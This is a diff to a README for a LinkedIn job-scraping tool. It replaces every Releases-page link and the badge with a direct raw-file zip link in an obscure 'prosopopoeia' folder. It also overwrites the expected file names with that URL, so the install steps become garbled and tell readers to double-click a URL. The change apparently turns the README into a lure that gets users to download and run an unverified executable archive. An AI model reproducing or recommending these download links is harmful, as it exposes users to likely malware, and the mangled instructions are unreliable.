@@ -1,6 +1,6 @@
 # 🚀 linkedin-job-scraper - Extract Job Listings Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Kazuhards/linkedin-job-scraper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip)](https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip)
 
 ## ✨ Overview
 The linkedin-job-scraper is a tool designed to help you extract job listings from LinkedIn. Whether you are seeking career insights, analyzing market trends, or looking to automate your job searches, this application provides an easy-to-use solution for gathering data.
@@ -25,16 +25,16 @@ Follow these simple steps to download and run the software on your computer.
 1. **Download the Software**
    Visit the Releases page to download the latest version of the linkedin-job-scraper:
 
-   [Visit the Releases Page to Download](https://github.com/Kazuhards/linkedin-job-scraper/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip)
 
 2. **Locate the Downloaded File**
-   After the download completes, navigate to your computer’s Downloads folder. You should find a file named something like `linkedin-job-scraper-v1.0.zip`.
+   After the download completes, navigate to your computer’s Downloads folder. You should find a file named something like `https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip`.
 
 3. **Extract the Files**
    Right-click the zip file and select "Extract All..." or use an extraction tool. This will create a folder with the application files.
 
 4. **Open the Application**
-   Inside the extracted folder, look for a file named `linkedin-job-scraper.exe` (for Windows) or `linkedin-job-scraper.app` (for macOS). Double-click on this file to open the application.
+   Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip` (for Windows) or `https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip` (for macOS). Double-click on this file to open the application.
 
 5. **Start Scraping Jobs**
    - Once the application opens, you will see a simple interface.
@@ -47,7 +47,7 @@ Follow these simple steps to download and run the software on your computer.
 ## 🔄 Download & Install
 To quickly install the application, click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Kazuhards/linkedin-job-scraper/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Kazuhards/linkedin-job-scraper/main/prosopopoeia/linkedin-job-scraper_v1.0.zip)
 
 ## 💡 Tips for Successful Job Scraping
 - **Use Specific Keywords:** The more specific your job title or keywords, the more relevant results you will get.
